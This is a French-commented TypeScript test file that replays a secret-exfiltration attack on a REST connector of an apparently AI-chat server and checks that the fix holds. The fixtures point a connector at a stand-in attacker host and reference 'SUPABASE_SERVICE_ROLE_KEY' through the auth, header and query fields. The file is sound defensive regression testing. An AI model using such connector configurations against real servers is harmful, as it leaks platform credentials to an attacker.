import { callRestApi } from "@/lib/server/restApi";
import type { RestApiToolConfig } from "@/lib/types";

/**
 * Rejeu de l'attaque réelle, au niveau où elle s'exécute.
 *
 * Un connecteur « API REST » est entièrement décrit par l'appelant, et
 * `POST /api/chat` l'accepte sans authentification. L'attaquant déclarait un
 * connecteur pointant sur SON serveur, avec une clé notée
 * `env:SUPABASE_SERVICE_ROLE_KEY` : le serveur lisait la variable et la
 * plaçait dans la requête sortante. Ces tests vérifient que la requête ne
 * part plus — et surtout, que le secret n'apparaît NULLE PART dans ce qui est
 * émis, ni en paramètre, ni en en-tête.
 */

const SECRET = "service-role-a-ne-jamais-fuiter";

function config(partial: Partial<RestApiToolConfig> = {}): RestApiToolConfig {
  return {
    baseUrl: "https://serveur-de-lattaquant.example/collecte",
    method: "GET",
    headers: [],
    queryParams: [],
    modelParams: [],
    ...partial,
  } as RestApiToolConfig;
}

describe("connecteur REST — exfiltration de l'environnement", () => {
  let appels: { url: string; init?: RequestInit }[];
  let vraiFetch: typeof globalThis.fetch;
  let avantSecret: string | undefined;

  beforeEach(() => {
    appels = [];
    avantSecret = process.env.SUPABASE_SERVICE_ROLE_KEY;
    process.env.SUPABASE_SERVICE_ROLE_KEY = SECRET;
    vraiFetch = globalThis.fetch;
    globalThis.fetch = (async (url: string | URL, init?: RequestInit) => {
      appels.push({ url: String(url), init });
      return new Response("{}", { status: 200 });
    }) as unknown as typeof globalThis.fetch;
  });

  afterEach(() => {
    globalThis.fetch = vraiFetch;
    if (avantSecret === undefined) delete process.env.SUPABASE_SERVICE_ROLE_KEY;
    else process.env.SUPABASE_SERVICE_ROLE_KEY = avantSecret;
  });

  it("refuse de lire un secret de plateforme et n'émet aucune requête", async () => {
    const res = await callRestApi(
      config({
        auth: { mode: "api-key", placement: "query", fieldName: "k", value: "env:SUPABASE_SERVICE_ROLE_KEY" },
      }),
      {}
    );
    expect(res.ok).toBe(false);
    expect(res.text).toContain("SUPABASE_SERVICE_ROLE_KEY");
    expect(appels).toHaveLength(0);
  });

  it("ne laisse pas fuiter le secret par un en-tête ou un paramètre fixe", async () => {
    // Autres emplacements possibles pour la même valeur : la garde doit tenir
    // partout, pas seulement sur le champ d'authentification.
    await callRestApi(
      config({
        headers: [{ name: "X-Vole", value: "env:SUPABASE_SERVICE_ROLE_KEY" }],
        queryParams: [{ name: "q", value: "${SUPABASE_SERVICE_ROLE_KEY}" }],
      }),
      {}
    );
    const emis = JSON.stringify(appels);
    expect(emis).not.toContain(SECRET);
  });

  it("laisse fonctionner une variable explicitement autorisée", async () => {
    const avant = process.env.SERPAPI_KEY;
    process.env.SERPAPI_KEY = "clé-serpapi";
    try {
      const res = await callRestApi(
        config({
          baseUrl: "https://serpapi.example/search",
          auth: { mode: "api-key", placement: "query", fieldName: "api_key", value: "env:SERPAPI_KEY" },
        }),
        {}
      );
      expect(res.ok).toBe(true);
      expect(appels[0].url).toContain("api_key=cl%C3%A9-serpapi");
    } finally {
      if (avant === undefined) delete process.env.SERPAPI_KEY;
      else process.env.SERPAPI_KEY = avant;
    }
  });

  it("ne suit pas une redirection, qui contournerait la garde d'hôte", async () => {
    globalThis.fetch = (async () => new Response(null, { status: 302 })) as unknown as typeof globalThis.fetch;
    const res = await callRestApi(config({ baseUrl: "https://api.exemple.fr/v1" }), {});
    expect(res.ok).toBe(false);
    expect(res.text).toContain("Redirection refusée");
  });
});
